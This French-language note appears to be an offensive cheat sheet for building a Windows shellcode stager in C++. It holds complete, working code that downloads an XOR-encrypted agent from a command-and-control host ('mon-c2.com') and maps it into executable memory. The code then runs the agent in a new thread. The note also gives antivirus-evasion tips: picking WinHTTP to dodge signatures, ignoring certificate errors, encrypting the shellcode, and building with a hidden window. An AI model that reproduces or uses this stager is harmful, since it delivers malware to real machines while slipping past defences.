## WinINet

Bibliothèque haut niveau, gère les proxies système automatiquement. Prend une URL complète d'un coup.

```cpp
#include <wininet.h>
// compilation : -lwininet
```

```cpp
void download(LPCWSTR url, std::vector<BYTE>& out)
{
    HINTERNET hNet  = InternetOpenW(L"Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    HINTERNET hFile = InternetOpenUrlW(hNet, url, NULL, 0,
                          INTERNET_FLAG_HYPERLINK |
                          INTERNET_FLAG_IGNORE_CERT_DATE_INVALID |
                          INTERNET_FLAG_IGNORE_CERT_CN_INVALID, 0);
    BYTE buf[4096];
    DWORD read;
    while (InternetReadFile(hFile, buf, sizeof(buf), &read) && read)
        out.insert(out.end(), buf, buf + read);
    InternetCloseHandle(hFile);
    InternetCloseHandle(hNet);
}
```

---

## WinHTTP

Bibliothèque bas niveau, moins associée aux malwares dans certaines signatures. Découpe host et path séparément.

```cpp
#include <winhttp.h>
// compilation : -lwinhttp
```

```cpp
void download(LPCWSTR host, LPCWSTR path, std::vector<BYTE>& out)
{
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    HINTERNET hConnect = WinHttpConnect(hSession, host, INTERNET_DEFAULT_HTTPS_PORT, 0);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0);
    WinHttpReceiveResponse(hRequest, NULL);
    BYTE buf[4096];
    DWORD read;
    while (WinHttpReadData(hRequest, buf, sizeof(buf), &read) && read)
        out.insert(out.end(), buf, buf + read);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}
```

---

## XOR

Chiffrer le shellcode côté serveur pour que l'AV ne puisse pas le scanner via le réseau.

Chiffrer avant d'uploader (Python) :
```bash
python3 -c "
key = b'monkey'
data = open('agent.x64.bin','rb').read()
open('agent.x64.bin.enc','wb').write(bytes(b ^ key[i%len(key)] for i,b in enumerate(data)))
"
```

Déchiffrer côté stager :
```cpp
void xor_decrypt(std::vector<BYTE>& data, const std::string& key)
{
    for (size_t i = 0; i < data.size(); ++i)
        data[i] ^= key[i % key.size()];
}
```

---

## Exemple complet WinINet

```cpp
#include <Windows.h>
#include <wininet.h>
#include <vector>
#include <string>

void download(LPCWSTR url, std::vector<BYTE>& out)
{
    HINTERNET hNet  = InternetOpenW(L"Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    HINTERNET hFile = InternetOpenUrlW(hNet, url, NULL, 0,
                          INTERNET_FLAG_HYPERLINK |
                          INTERNET_FLAG_IGNORE_CERT_DATE_INVALID |
                          INTERNET_FLAG_IGNORE_CERT_CN_INVALID, 0);
    BYTE buf[4096];
    DWORD read;
    while (InternetReadFile(hFile, buf, sizeof(buf), &read) && read)
        out.insert(out.end(), buf, buf + read);
    InternetCloseHandle(hFile);
    InternetCloseHandle(hNet);
}

void xor_decrypt(std::vector<BYTE>& data, const std::string& key)
{
    for (size_t i = 0; i < data.size(); ++i)
        data[i] ^= key[i % key.size()];
}

int main()
{
    std::vector<BYTE> payload;
    download(L"https://mon-c2/agent.x64.bin.enc", payload);
    xor_decrypt(payload, "monkey");

    auto mem = VirtualAlloc(NULL, payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memcpy(mem, payload.data(), payload.size());
    DWORD old;
    VirtualProtect(mem, payload.size(), PAGE_EXECUTE_READ, &old);

    DWORD tid;
    auto hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, &tid);
    CloseHandle(hThread);
    Sleep(INFINITE);
}
```

```powershell
g++ stager.cpp -o stager.exe -lwininet -static-libgcc -static-libstdc++ -mwindows
```

---

## Exemple complet WinHTTP

```cpp
#include <Windows.h>
#include <winhttp.h>
#include <vector>
#include <string>

void download(LPCWSTR host, LPCWSTR path, std::vector<BYTE>& out)
{
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    HINTERNET hConnect = WinHttpConnect(hSession, host, INTERNET_DEFAULT_HTTPS_PORT, 0);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0);
    WinHttpReceiveResponse(hRequest, NULL);
    BYTE buf[4096];
    DWORD read;
    while (WinHttpReadData(hRequest, buf, sizeof(buf), &read) && read)
        out.insert(out.end(), buf, buf + read);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

void xor_decrypt(std::vector<BYTE>& data, const std::string& key)
{
    for (size_t i = 0; i < data.size(); ++i)
        data[i] ^= key[i % key.size()];
}

int main()
{
    std::vector<BYTE> payload;
    download(L"mon-c2.com", L"/agent.x64.bin.enc", payload);
    xor_decrypt(payload, "monkey");

    auto mem = VirtualAlloc(NULL, payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memcpy(mem, payload.data(), payload.size());
    DWORD old;
    VirtualProtect(mem, payload.size(), PAGE_EXECUTE_READ, &old);

    DWORD tid;
    auto hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, &tid);
    CloseHandle(hThread);
    Sleep(INFINITE);
}
```

```powershell
g++ stager.cpp -o stager.exe -lwinhttp -static-libgcc -static-libstdc++ -mwindows
```
